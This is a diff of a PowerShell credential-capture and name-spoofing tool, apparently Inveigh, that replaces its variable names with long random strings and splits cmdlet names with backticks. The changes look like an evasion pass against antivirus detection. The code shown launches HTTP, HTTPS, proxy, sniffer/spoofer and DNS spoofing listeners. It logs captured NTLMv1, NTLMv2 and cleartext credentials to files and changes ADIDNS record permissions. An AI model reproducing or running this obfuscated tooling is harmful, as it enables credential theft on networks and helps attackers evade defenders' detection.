+                Invoke-ADIDNSCheck -Credential $ssnImzbkFylCcfywIEEVBwc -eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE $zkTvnUBoWamaHbrMDvklWqGBdwC -ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay $NuKysEWfwHfjXVFRVZPgsYOxkAnIFj -oOKRVkPmhffpDSkVLIFGzJKYJ $XUZlETEKoZKWHdmmfbBJczSphZSZBDSdIxXzDCCaAERO -VLmckwKaUbSGuBdaTXxvwvzODhZHIWAWhufWP $uMFJurNQLlKXHMAtZAvWpotfqfIjJctkCymHxbpcYbcoz -jJuFyNBnBUrFBsyGTwEXMfPDfd $UOzMMsyJArPmhisyLVaGMsjMfqvxxPEEqcCGGGiDZcZ -zgPBavHAgJDNXciLWtpacZIBhUFjXbA $BFlwqVfFgHmnWSTrqOBa -WVdxmmYgroyvOMdHdmZvxskAbk $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table -LWGbLMgsKkBNqMwjLgBreufoI $HrZcGMZkGIqzkfsIOcryPlOaGnDRdnbAQIgw -SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW $EishpmLeabgtsVFwpBjSiSwYdQOFqXys -SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC $IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE
             }
             catch
             {
                 $error_message = $_.Exception.Message
                 $error_message = $error_message -replace "`n",""
-                $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
             }
 
-            $LightOval.request_table_updated = $false
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table_updated = $false
         }
 
-        if($LightOval.ADIDNS -and $LightOval.ADIDNS_table.Count -gt 0)
+        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.Count -gt 0)
         {
-            [Array]$BaseDapper = $LightOval.ADIDNS_table.Keys
+            [Array]$ZnDEbMvBkazmPVmZeClxgWGZlJSuTfUIYDyNuLz = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.Keys
 
-            foreach($KnottyHelp in $BaseDapper)
+            foreach($iSFFbNmIfHTyxYEeSsanYn in $ZnDEbMvBkazmPVmZeClxgWGZlJSuTfUIYDyNuLz)
             {
                 
-                if($LightOval.ADIDNS_table.$KnottyHelp -eq 1)
+                if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.$iSFFbNmIfHTyxYEeSsanYn -eq 1)
                 {
 
                     try
                     {
-                        Grant-ADIDNSPermission -Credential $BlackFilthy -DesireUnique $TrapJoin -TrickWander $KnownFood -FilmJazzy $KnottyHelp -PiesLearn 'Authenticated Users'-PersonCheer $FullGrin
-                        $LightOval.ADIDNS_table.$KnottyHelp = 2
+                        Grant-ADIDNSPermission -Credential $ssnImzbkFylCcfywIEEVBwc -ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay $NuKysEWfwHfjXVFRVZPgsYOxkAnIFj -oOKRVkPmhffpDSkVLIFGzJKYJ $XUZlETEKoZKWHdmmfbBJczSphZSZBDSdIxXzDCCaAERO -ifczfhVhxXUsXrLMmesQQ $iSFFbNmIfHTyxYEeSsanYn -JAnXNgAfJiWSopRPSyvLZLuDFXIfMZZxhDd 'Authenticated Users'-SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC $IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.$iSFFbNmIfHTyxYEeSsanYn = 2
                     }
                     catch
                     {
                         $error_message = $_.Exception.Message
                         $error_message = $error_message -replace "`n",""
-                        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-                        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS ACE add for host record for $KnottyHelp failed") > $null
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS ACE add for host record for $iSFFbNmIfHTyxYEeSsanYn failed") > $null
                     }
 
                 }
@@ -5431,61 +5431,61 @@ $ErectJog =
 
         }
 
-        if($LightOval.file_output)
+        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_output)
         {
 
-            while($LightOval.log_file_queue.Count -gt 0)
+            while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_file_queue.Count -gt 0)
             {
-                $LightOval.log_file_queue[0]|`out-fi`le $LightOval.log_out_file -Append
-                $LightOval.log_file_queue.RemoveAt(0)
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_file_queue[0]|`out`-f`i`le $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_out_file -Append
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_file_queue.RemoveAt(0)
             }
 
-            while($LightOval.NTLMv1_file_queue.Count -gt 0)
+            while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_file_queue.Count -gt 0)
             {
-                $LightOval.NTLMv1_file_queue[0]|`out-fi`le $LightOval.NTLMv1_out_file -Append
-                $LightOval.NTLMv1_file_queue.RemoveAt(0)
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_file_queue[0]|`out`-f`i`le $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_out_file -Append
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_file_queue.RemoveAt(0)
             }
 
-            while($LightOval.NTLMv2_file_queue.Count -gt 0)
+            while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_file_queue.Count -gt 0)
             {
-                $LightOval.NTLMv2_file_queue[0]|`out-fi`le $LightOval.NTLMv2_out_file -Append
-                $LightOval.NTLMv2_file_queue.RemoveAt(0)
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_file_queue[0]|`out`-f`i`le $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_out_file -Append
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_file_queue.RemoveAt(0)
             }
 
-            while($LightOval.cleartext_file_queue.Count -gt 0)
+            while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_file_queue.Count -gt 0)
             {
-                $LightOval.cleartext_file_queue[0]|`out-fi`le $LightOval.cleartext_out_file -Append
-                $LightOval.cleartext_file_queue.RemoveAt(0)
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_file_queue[0]|`out`-f`i`le $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_out_file -Append
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_file_queue.RemoveAt(0)
             }
 
-            while($LightOval.POST_request_file_queue.Count -gt 0)
+            while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_file_queue.Count -gt 0)
             {
-                $LightOval.POST_request_file_queue[0]|`out-fi`le $LightOval.POST_request_out_file -Append
-                $LightOval.POST_request_file_queue.RemoveAt(0)
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_file_queue[0]|`out`-f`i`le $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_out_file -Append
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_file_queue.RemoveAt(0)
             }
 
         }
 
-        if(!$LightOval.console_output -and $FailDad -ge 0)
+        if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_output -and $futRGbdymzbIAOSHtlviC -ge 0)
         {
 
-            while($LightOval.console_queue.Count -gt $FailDad -and !$LightOval.console_output)
+            while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.Count -gt $futRGbdymzbIAOSHtlviC -and !$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_output)
             {
-                $LightOval.console_queue.RemoveAt(0)
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.RemoveAt(0)
             }
 
         }
 
-        if(!$LightOval.status_output)
+        if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.status_output)
         {
             Invoke-OutputQueueLoop
         }
 
         Start-Sleep -m 5
         
-        if($LightOval.stop)
+        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.stop)
         {
-            $LightOval.console_queue.Clear()
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue.Clear()
             Stop-InveighRunspace
         }
 
@@ -5499,25 +5499,25 @@ $ErectJog =
 # Microsoft".
 function HTTPListener
 {
-    $SufferRefuse = $false
-    $HugeDead = $false
-    $StageRhyme = [RunspaceFactory]::CreateRunspace()
-    $StageRhyme.Open()
-    $StageRhyme.SessionStateProxy.SetVariable('inveigh',$LightOval)
-    $FogInsect = [PowerShell]::Create()
-    $FogInsect.Runspace = $StageRhyme
-    $FogInsect.AddScript($LivelySqueak) > $null
-    $FogInsect.AddScript($UppitySheep) > $null
-    $FogInsect.AddScript($OrangeMushy) > $null
-    $FogInsect.AddScript($SwimChief).AddArgument($HeavySmall).AddArgument($HeapDetect).AddArgument(
-        $KindLick).AddArgument($MilkyCelery).AddArgument($LearnHelp).AddArgument(
-        $OrangeDog).AddArgument($SkirtStone).AddArgument($SuperbBlood).AddArgument(
-        $SwingHorses).AddArgument($RightSnail).AddArgument($LunchCheat).AddArgument(
-        $BadgeKind).AddArgument($StewLean).AddArgument($YummyShame).AddArgument(
-        $YawnOdd).AddArgument($HugeDead).AddArgument($SmashDolls).AddArgument($MournMean).AddArgument(
-        $SilkySmelly).AddArgument($JumpyWrench).AddArgument($ExpandNest).AddArgument($SufferRefuse).AddArgument(
-        $LoadTrade).AddArgument($RobustFail).AddArgument($ReasonTrust) > $null
-    $FogInsect.BeginInvoke() > $null
+    $ZCWCfsgrcLUlJogmhFPdzZOB = $false
+    $TlvcCDlGUgNUeGiPhbVgt = $false
+    $ZuSTfqBTTUXjwRQpLnFaosAtNalCtzAgBdjwtBDDA = [RunspaceFactory]::CreateRunspace()
+    $ZuSTfqBTTUXjwRQpLnFaosAtNalCtzAgBdjwtBDDA.Open()
+    $ZuSTfqBTTUXjwRQpLnFaosAtNalCtzAgBdjwtBDDA.SessionStateProxy.SetVariable('inveigh',$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV)
+    $XyWpmEvfIJhcoeuRgwCvvyZxqUXjDHboLXyGY = [PowerShell]::Create()
+    $XyWpmEvfIJhcoeuRgwCvvyZxqUXjDHboLXyGY.Runspace = $ZuSTfqBTTUXjwRQpLnFaosAtNalCtzAgBdjwtBDDA
+    $XyWpmEvfIJhcoeuRgwCvvyZxqUXjDHboLXyGY.AddScript($bfhGGCJCKYcIazbgbfVjAZtmjUAKMEb) > $null
+    $XyWpmEvfIJhcoeuRgwCvvyZxqUXjDHboLXyGY.AddScript($CbdNUtPgouuAVLJbCTRwuCSvAEcXQqwskA) > $null
+    $XyWpmEvfIJhcoeuRgwCvvyZxqUXjDHboLXyGY.AddScript($ujSHyjvlCzlSXpaNLgWG) > $null
+    $XyWpmEvfIJhcoeuRgwCvvyZxqUXjDHboLXyGY.AddScript($uVNwcSuPpObwGkXaIHGnPjejKgykjinwRX).AddArgument($xUlvMGNvOmaODuSVmfwndiKyNJVQvZCjtHWjFUWcWmBU).AddArgument($fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn).AddArgument(
+        $JoXWcoXEYHNGuWREHpaUFbcXY).AddArgument($MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho).AddArgument($HmzaQTfoETMMBLLoFthmsnPeudAqyQhk).AddArgument(
+        $jSRJtPliVOZcEheIvIfSdzZkyexraLCnkoMNKC).AddArgument($SKVFmrXEfBIfxjyvDecjFzVZvkyOhdiApBpgWeXKPiyP).AddArgument($KkTbrgewekSBhNviJsMfTclAsOTAazQqLRRlNQY).AddArgument(
+        $GqExLUpPHBnrxIigVOcPUZyEfogVhxNbREMxfzIAcS).AddArgument($JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA).AddArgument($LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb).AddArgument(
+        $mxyeWmucysuQaCQWfngETzsqqbNiqa).AddArgument($lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl).AddArgument($MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR).AddArgument(
+        $obcRRswvZXEpdnVKmVqxjHfaEIVMDzeLYwwAE).AddArgument($TlvcCDlGUgNUeGiPhbVgt).AddArgument($vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS).AddArgument($NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu).AddArgument(
+        $NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV).AddArgument($QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB).AddArgument($eHhdMzJITQkHvLFvGvuaGszuwtoKkVctXVaSotDPalR).AddArgument($ZCWCfsgrcLUlJogmhFPdzZOB).AddArgument(
+        $QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM).AddArgument($LBwGGAkoRuUTfNJopnGziYvEpsmlXdMTqzqc).AddArgument($aWWNkGgRqzQWHhdZkUzqbTdql) > $null
+    $XyWpmEvfIJhcoeuRgwCvvyZxqUXjDHboLXyGY.BeginInvoke() > $null
 }
 
 Start-Sleep -m 50
@@ -5525,25 +5525,25 @@ Start-Sleep -m 50
 # Microsoft".
 function HTTPSListener
 {
-    $SufferRefuse = $false
-    $HugeDead = $true
-    $CrownRing = [RunspaceFactory]::CreateRunspace()
-    $CrownRing.Open()
-    $CrownRing.SessionStateProxy.SetVariable('inveigh',$LightOval)
-    $TryThin = [PowerShell]::Create()
-    $TryThin.Runspace = $CrownRing
-    $TryThin.AddScript($LivelySqueak) > $null
-    $TryThin.AddScript($UppitySheep) > $null
-    $TryThin.AddScript($OrangeMushy) > $null
-    $TryThin.AddScript($SwimChief).AddArgument($HeavySmall).AddArgument($HeapDetect).AddArgument(
-        $KindLick).AddArgument($MilkyCelery).AddArgument($LearnHelp).AddArgument(
-        $OrangeDog).AddArgument($SkirtStone).AddArgument($SuperbBlood).AddArgument(
-        $SwingHorses).AddArgument($RightSnail).AddArgument($HarmFruit).AddArgument(
-        $BadgeKind).AddArgument($StewLean).AddArgument($YummyShame).AddArgument(
-        $YawnOdd).AddArgument($HugeDead).AddArgument($SmashDolls).AddArgument($MournMean).AddArgument(
-        $SilkySmelly).AddArgument($JumpyWrench).AddArgument($ExpandNest).AddArgument($SufferRefuse).AddArgument(
-        $LoadTrade).AddArgument($RobustFail).AddArgument($ReasonTrust) > $null
-    $TryThin.BeginInvoke() > $null
+    $ZCWCfsgrcLUlJogmhFPdzZOB = $false
+    $TlvcCDlGUgNUeGiPhbVgt = $true
+    $AogiwKLzhlOCnHwFquSxuFIPBSrxBzzRhrFHbMSVof = [RunspaceFactory]::CreateRunspace()
+    $AogiwKLzhlOCnHwFquSxuFIPBSrxBzzRhrFHbMSVof.Open()
+    $AogiwKLzhlOCnHwFquSxuFIPBSrxBzzRhrFHbMSVof.SessionStateProxy.SetVariable('inveigh',$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV)
+    $nRikAQgwCwdkwPZnfTAAnCsCQVZyR = [PowerShell]::Create()
+    $nRikAQgwCwdkwPZnfTAAnCsCQVZyR.Runspace = $AogiwKLzhlOCnHwFquSxuFIPBSrxBzzRhrFHbMSVof
+    $nRikAQgwCwdkwPZnfTAAnCsCQVZyR.AddScript($bfhGGCJCKYcIazbgbfVjAZtmjUAKMEb) > $null
+    $nRikAQgwCwdkwPZnfTAAnCsCQVZyR.AddScript($CbdNUtPgouuAVLJbCTRwuCSvAEcXQqwskA) > $null
+    $nRikAQgwCwdkwPZnfTAAnCsCQVZyR.AddScript($ujSHyjvlCzlSXpaNLgWG) > $null
+    $nRikAQgwCwdkwPZnfTAAnCsCQVZyR.AddScript($uVNwcSuPpObwGkXaIHGnPjejKgykjinwRX).AddArgument($xUlvMGNvOmaODuSVmfwndiKyNJVQvZCjtHWjFUWcWmBU).AddArgument($fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn).AddArgument(
+        $JoXWcoXEYHNGuWREHpaUFbcXY).AddArgument($MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho).AddArgument($HmzaQTfoETMMBLLoFthmsnPeudAqyQhk).AddArgument(
+        $jSRJtPliVOZcEheIvIfSdzZkyexraLCnkoMNKC).AddArgument($SKVFmrXEfBIfxjyvDecjFzVZvkyOhdiApBpgWeXKPiyP).AddArgument($KkTbrgewekSBhNviJsMfTclAsOTAazQqLRRlNQY).AddArgument(
+        $GqExLUpPHBnrxIigVOcPUZyEfogVhxNbREMxfzIAcS).AddArgument($JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA).AddArgument($ebIBhGGOpbSBFXWqVDkNgnIkDLxkcIi).AddArgument(
+        $mxyeWmucysuQaCQWfngETzsqqbNiqa).AddArgument($lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl).AddArgument($MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR).AddArgument(
+        $obcRRswvZXEpdnVKmVqxjHfaEIVMDzeLYwwAE).AddArgument($TlvcCDlGUgNUeGiPhbVgt).AddArgument($vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS).AddArgument($NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu).AddArgument(
+        $NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV).AddArgument($QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB).AddArgument($eHhdMzJITQkHvLFvGvuaGszuwtoKkVctXVaSotDPalR).AddArgument($ZCWCfsgrcLUlJogmhFPdzZOB).AddArgument(
+        $QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM).AddArgument($LBwGGAkoRuUTfNJopnGziYvEpsmlXdMTqzqc).AddArgument($aWWNkGgRqzQWHhdZkUzqbTdql) > $null
+    $nRikAQgwCwdkwPZnfTAAnCsCQVZyR.BeginInvoke() > $null
 }
 
 Start-Sleep -m 50
@@ -5551,198 +5551,198 @@ Start-Sleep -m 50
 # Microsoft".
 function ProxyListener
 {
-    $SufferRefuse = $true
-    $HugeDead = $false
-    $RetireMonkey = [RunspaceFactory]::CreateRunspace()
-    $RetireMonkey.Open()
-    $RetireMonkey.SessionStateProxy.SetVariable('inveigh',$LightOval)
-    $BlushLiquid = [PowerShell]::Create()
-    $BlushLiquid.Runspace = $RetireMonkey
-    $BlushLiquid.AddScript($LivelySqueak) > $null
-    $BlushLiquid.AddScript($UppitySheep) > $null
-    $BlushLiquid.AddScript($OrangeMushy) > $null
-    $BlushLiquid.AddScript($SwimChief).AddArgument($HeavySmall).AddArgument($HeapDetect).AddArgument(
-        $KindLick).AddArgument($MilkyCelery).AddArgument($LearnHelp).AddArgument(
-        $OrangeDog).AddArgument($SkirtStone).AddArgument($SuperbBlood).AddArgument(
-        $SwingHorses).AddArgument($PreachBad).AddArgument($OafishAllow).AddArgument(
-        $BadgeKind).AddArgument($StewLean).AddArgument($YummyShame).AddArgument(
-        $YawnOdd).AddArgument($HugeDead).AddArgument($SmashDolls).AddArgument($MournMean).AddArgument(
-        $SilkySmelly).AddArgument($JumpyWrench).AddArgument($ExpandNest).AddArgument($SufferRefuse).AddArgument(
-        $LoadTrade).AddArgument($RobustFail).AddArgument($ReasonTrust) > $null
-    $BlushLiquid.BeginInvoke() > $null
+    $ZCWCfsgrcLUlJogmhFPdzZOB = $true
+    $TlvcCDlGUgNUeGiPhbVgt = $false
+    $hxaJttXUPjfhjVRpCiCmoqOXfQGaZUPegis = [RunspaceFactory]::CreateRunspace()
+    $hxaJttXUPjfhjVRpCiCmoqOXfQGaZUPegis.Open()
+    $hxaJttXUPjfhjVRpCiCmoqOXfQGaZUPegis.SessionStateProxy.SetVariable('inveigh',$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV)
+    $ZnAttLMxIZQFqMQnVVnsdqDnTvspMvV = [PowerShell]::Create()
+    $ZnAttLMxIZQFqMQnVVnsdqDnTvspMvV.Runspace = $hxaJttXUPjfhjVRpCiCmoqOXfQGaZUPegis
+    $ZnAttLMxIZQFqMQnVVnsdqDnTvspMvV.AddScript($bfhGGCJCKYcIazbgbfVjAZtmjUAKMEb) > $null
+    $ZnAttLMxIZQFqMQnVVnsdqDnTvspMvV.AddScript($CbdNUtPgouuAVLJbCTRwuCSvAEcXQqwskA) > $null
+    $ZnAttLMxIZQFqMQnVVnsdqDnTvspMvV.AddScript($ujSHyjvlCzlSXpaNLgWG) > $null
+    $ZnAttLMxIZQFqMQnVVnsdqDnTvspMvV.AddScript($uVNwcSuPpObwGkXaIHGnPjejKgykjinwRX).AddArgument($xUlvMGNvOmaODuSVmfwndiKyNJVQvZCjtHWjFUWcWmBU).AddArgument($fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn).AddArgument(
+        $JoXWcoXEYHNGuWREHpaUFbcXY).AddArgument($MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho).AddArgument($HmzaQTfoETMMBLLoFthmsnPeudAqyQhk).AddArgument(
+        $jSRJtPliVOZcEheIvIfSdzZkyexraLCnkoMNKC).AddArgument($SKVFmrXEfBIfxjyvDecjFzVZvkyOhdiApBpgWeXKPiyP).AddArgument($KkTbrgewekSBhNviJsMfTclAsOTAazQqLRRlNQY).AddArgument(
+        $GqExLUpPHBnrxIigVOcPUZyEfogVhxNbREMxfzIAcS).AddArgument($uyfyGXdurVEEVxvRILOlr).AddArgument($uVKWZlyRdsxhxHZhEhpVHaVYWFrjLZNRwXVHZiokBazh).AddArgument(
+        $mxyeWmucysuQaCQWfngETzsqqbNiqa).AddArgument($lPdyiYkNubAdzFDDAVCwBwpJsVNHasQHppbgl).AddArgument($MslTACztzyXoaKHvwDiYETatjVpozshBYotjqUR).AddArgument(
+        $obcRRswvZXEpdnVKmVqxjHfaEIVMDzeLYwwAE).AddArgument($TlvcCDlGUgNUeGiPhbVgt).AddArgument($vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS).AddArgument($NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu).AddArgument(
+        $NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV).AddArgument($QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB).AddArgument($eHhdMzJITQkHvLFvGvuaGszuwtoKkVctXVaSotDPalR).AddArgument($ZCWCfsgrcLUlJogmhFPdzZOB).AddArgument(
+        $QHapxkBOzdGDgKrNpoGOOUOrxeHqddKnclM).AddArgument($LBwGGAkoRuUTfNJopnGziYvEpsmlXdMTqzqc).AddArgument($aWWNkGgRqzQWHhdZkUzqbTdql) > $null
+    $ZnAttLMxIZQFqMQnVVnsdqDnTvspMvV.BeginInvoke() > $null
 }
 
 # Microsoft".
 function SnifferSpoofer
 {
-    $MachoWise = [RunspaceFactory]::CreateRunspace()
-    $MachoWise.Open()
-    $MachoWise.SessionStateProxy.SetVariable('inveigh',$LightOval)
-    $MatchDog = [PowerShell]::Create()
-    $MatchDog.Runspace = $MachoWise
-    $MatchDog.AddScript($LivelySqueak) > $null
-    $MatchDog.AddScript($UppitySheep) > $null
-    $MatchDog.AddScript($OrangeMushy) > $null
-    $MatchDog.AddScript($SuckFaded) > $null
-    $MatchDog.AddScript($InnatePrefer).AddArgument($HomelyShow).AddArgument($HandsHop).AddArgument(
-        $BootShrill).AddArgument($MeekSmoggy).AddArgument($SmashDolls).AddArgument($HeapDetect).AddArgument($KindLick).AddArgument(
-        $MilkyCelery).AddArgument($LearnHelp).AddArgument($LipMeat).AddArgument(
-        $TeaseNasty).AddArgument($BoilClever).AddArgument($WantLittle).AddArgument($MurderOffer).AddArgument($PeckFirst).AddArgument(
-        $BlushCattle).AddArgument($ThawMiddle).AddArgument($SilkySmelly).AddArgument($SlimyCable).AddArgument(
-        $BreezyDesign).AddArgument($FairAblaze).AddArgument($NorthAmuck).AddArgument($HoleRoute).AddArgument(
-        $BikeLoud).AddArgument($StickLame).AddArgument($ObeyAttack).AddArgument(
-        $WoozyClose).AddArgument($PlugTour).AddArgument($SmokeFang).AddArgument(
-        $WrongAnts).AddArgument($JokeFaulty).AddArgument(
-        $OwnBump).AddArgument($SameSneaky) > $null
-    $MatchDog.BeginInvoke() > $null
+    $VyrcWtSJUfnusJlkHBOkRRymVDbepQD = [RunspaceFactory]::CreateRunspace()
+    $VyrcWtSJUfnusJlkHBOkRRymVDbepQD.Open()
+    $VyrcWtSJUfnusJlkHBOkRRymVDbepQD.SessionStateProxy.SetVariable('inveigh',$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV)
+    $CFeKirERhHFtcYmtuKxfewUHPBlwpXUzhn = [PowerShell]::Create()
+    $CFeKirERhHFtcYmtuKxfewUHPBlwpXUzhn.Runspace = $VyrcWtSJUfnusJlkHBOkRRymVDbepQD
+    $CFeKirERhHFtcYmtuKxfewUHPBlwpXUzhn.AddScript($bfhGGCJCKYcIazbgbfVjAZtmjUAKMEb) > $null
+    $CFeKirERhHFtcYmtuKxfewUHPBlwpXUzhn.AddScript($CbdNUtPgouuAVLJbCTRwuCSvAEcXQqwskA) > $null
+    $CFeKirERhHFtcYmtuKxfewUHPBlwpXUzhn.AddScript($ujSHyjvlCzlSXpaNLgWG) > $null
+    $CFeKirERhHFtcYmtuKxfewUHPBlwpXUzhn.AddScript($CuMFRHzqaheriSiNsNgplCLGmSOjjJFkTimavdFPXl) > $null
+    $CFeKirERhHFtcYmtuKxfewUHPBlwpXUzhn.AddScript($dfKYZGwoOCUxIEtzUcKsIGxqsdoGmTTMfAoTd).AddArgument($tPEylzZKZOmcrNuZqaNvxfEfrUAkL).AddArgument($uJYtaPKHBkqYNTkyQSeECcLBxVkiaeVYMOZmxVHhhl).AddArgument(
+        $aIowrpuHkOxENKSShZvEwCIJzxVgFyNLYKmALixgLNWyk).AddArgument($ljmosEibVSNBPotWNpujNBqreoZueTjDFsfrajowAsCn).AddArgument($vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS).AddArgument($fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn).AddArgument($JoXWcoXEYHNGuWREHpaUFbcXY).AddArgument(
+        $MzEtrLTVqEtcWOHYZYMMuVcUPHPAjDcOANSdrVCoRiWho).AddArgument($HmzaQTfoETMMBLLoFthmsnPeudAqyQhk).AddArgument($PFkUZTrIToIoyXaKEeXORSPy).AddArgument(
+        $UdYfMnaGXJWMXhxYZmYdzwcmAzjlyonIBluDRRRurFD).AddArgument($QdOGoORVrhoEArPgHPqrqy).AddArgument($oiEknJevzfgMBjSqYIpc).AddArgument($LvtxlyiEnOfiOybKhfWwKTUJzJGquSXviBRRk).AddArgument($FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO).AddArgument(
+        $fgjekbNhYQKGsQdqOkUhuYvojUQK).AddArgument($XhwellVoTKeVMVnjDxSPEtBaYbtZbnzznVRtpfqiMxZZ).AddArgument($NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV).AddArgument($QXplYkjxeRFAgTbHwoZGdRyj).AddArgument(
+        $xiTnjmjZESCjsSHBdSaGp).AddArgument($NJquQJdotFLnYRzmvZcDDMgYuxhLWvmllbBNpsWFnKORo).AddArgument($UgjMonOdclnvuXTUStjJPlyfcIaSHwykwOJbBB).AddArgument($fASVUOYmrApOtQBmKFuEovhUMlVuanUGYXvQMnoGTxjXo).AddArgument(
+        $EPlJedBuToZfupQVQRyNJcsGRdsiyc).AddArgument($zkTvnUBoWamaHbrMDvklWqGBdwC).AddArgument($GeJSNuMkVuobUeQRhIVNdNxEwPrMoNg).AddArgument(
+        $swtccPhWthPrfRuqcBjGDBsGzLJxpUPliCqsEYyFZFe).AddArgument($LPmXJzyXqTgdUoElyxFCYzOJzqmSu).AddArgument($TUiftddccfYQxZeoLdwPKCLKmdiXZImsjJoICXnLErAY).AddArgument(
+        $eEmdEINEKedVTvUFZHbuolOJMVn).AddArgument($iNyWtiQGdKJEvnLZUaOj).AddArgument(
+        $wDCFDGIoGZceCUiHjkwAZDQXJJNKhHkWrGexcePVDeWCz).AddArgument($DdjubLRjwAypaYSppdSjdNWWgjtwdcxUchRdcyC) > $null
+    $CFeKirERhHFtcYmtuKxfewUHPBlwpXUzhn.BeginInvoke() > $null
 }
 
 # Microsoft".
 function DNSSpoofer
 {
-    $MetalCellar = [RunspaceFactory]::CreateRunspace()
-    $MetalCellar.Open()
-    $MetalCellar.SessionStateProxy.SetVariable('inveigh',$LightOval)
-    $PlantsArch = [PowerShell]::Create()
-    $PlantsArch.Runspace = $MetalCellar
-    $PlantsArch.AddScript($LivelySqueak) > $null
